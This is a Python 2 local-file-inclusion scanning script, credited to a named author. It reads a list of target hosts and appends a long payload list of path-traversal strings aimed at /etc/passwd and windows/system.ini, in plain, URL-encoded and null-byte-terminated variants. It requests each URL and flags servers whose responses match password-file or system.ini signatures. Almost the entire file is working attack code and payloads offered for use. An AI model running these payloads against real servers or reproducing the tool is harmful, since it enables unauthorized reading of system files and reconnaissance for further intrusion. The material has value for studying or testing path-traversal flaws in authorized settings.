import re, os, sys, time, requests

class colors:
        def __init__(self):
                self.green = "\033[92m"
                self.blue = "\033[94m"
                self.bold = "\033[1m"
                self.yellow = "\033[93m"
                self.red = "\033[91m"
                self.end = "\033[0m"
rudcol = colors()

if os.name == 'nt':
	os.system('cls')
else:
	os.system('clear')

def usage():
	fname = sys.argv[0]
	print 'Usage:'
	print '$ python ' + fname + ' file_list'

print '''
		########################################
		#   LFI Injection                      #
		#     By Rudra Sarkar                  #
		#       twitter.com/rudr4_sarkar       #
		########################################

		Maybe it works slowly.Don't worry Because it only
		Find out the vlun not error.

		Cheers,

	  '''

if len(sys.argv) <= 1:
	usage()
	sys.exit(0)
else:
	file = sys.argv[1]

payloads = ['/etc/passwd',
			'../etc/passwd',
			'../../etc/passwd',
			'../../../etc/passwd',
			'../../../../etc/passwd',
			'../../../../../etc/passwd',
			'../../../../../../etc/passwd',
			'../../../../../../../etc/passwd',
			'../../../../../../../../etc/passwd',
			'../../../../../../../../../etc/passwd',
			'../../../../../../../../../../etc/passwd',
			'../../../../../../../../../../../etc/passwd',
			'../../../../../../../../../../../../etc/passwd',
			'../../../../../../../../../../../../../etc/passwd',
			'../../../../../../../../../../../../../../etc/passwd',
			'../../../../../../../../../../../../../../../etc/passwd',
			'%2fetc%2fpasswd',
			'..%2fetc%2fpasswd',
			'..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd',
			'..//etc//passwd',
			'..//..//etc//passwd',
			'..//..//..//etc//passwd',
			'..//..//..//..//etc//passwd',
			'..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd',
			'..//etc//passwd%00',
			'..//..//etc//passwd%00',
			'..//..//..//etc//passwd%00',
			'..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//..//..//etc//passwd%00',
			'../windows/system.ini',
			'../../windows/system.ini',
			'../../../windows/system.ini',
			'../../../../windows/system.ini',
			'../../../../../windows/system.ini',
			'../../../../../../windows/system.ini',
			'../../../../../../../windows/system.ini',
			'../windows/system.ini%00',
			'../../windows/system.ini%00',
			'../../../windows/system.ini%00',
			'../../../../windows/system.ini%00',
			'../../../../../windows/system.ini%00',
			'../../../../../../windows/system.ini%00',
			'../../../../../../../windows/system.ini%00',
			'../../../../../../../../windows/system.ini%00',
			'.././../../../../../../../windows/system.ini%00',
			'../../../../../../../../../../windows/system.ini%00',
			'../../../../../../../../../../../windows/system.ini%00',
			'../../../../../../../../../../../../windows/system.ini%00',
			'../../../../../../../../../../../../../windwos/system.ini%00',
			'..%2fwindows%2fsystem.ini%00',
			'..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini%00',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindwos%2fsystem.ini%00',
			'..//windows//system.ini%00',
			'..//..//windows//system.ini%00',
			'..//..//..//windows//system.ini%00',
			'..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//..//windows//system.ini%00',
			'..//.//..//..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//windows//system.ini%00',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//windwos//system.ini%00',
			'..%2fwindows%2fsystem.ini',
			'..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f.%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fsystem.ini',
			'..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindwos%2fsystem.ini',
			'..//windows//system.ini',
			'..//..//windows//system.ini',
			'..//..//..//windows//system.ini',
			'..//..//..//..//windows//system.ini',
			'..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//..//windows//system.ini',
			'..//.//..//..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//..//..//..//..//..//windows//system.ini',
			'..//..//..//..//..//..//..//..//..//..//..//..//..//windwos//system.ini'
			]
check = re.compile("; for 16-bit app support|root:x:0:0", re.I)

with open(file) as f:
	start_time = time.asctime(time.localtime(time.time()))
	print rudcol.green + '[+] LFI Injector Starting ......' + rudcol.end
	print rudcol.green + '[+] Starting At ' + start_time + rudcol.end
	for line in f:
		try:
			for payload in payloads:
				fil = line.strip()
				u = 'http://' + fil + str(payload).strip()
				
				r = requests.get(u)
				b = r.text
				res = r.status_code

				for html in b:
					checker = re.findall(check, b)
				if checker:
					print ''
					print rudcol.green + 'c- LFI Injectable' + rudcol.end
					print rudcol.green + '|' + rudcol.end
					print rudcol.green + 'c- URL: ' + u + rudcol.end
		except:
			print 'Error or Connection Lost !'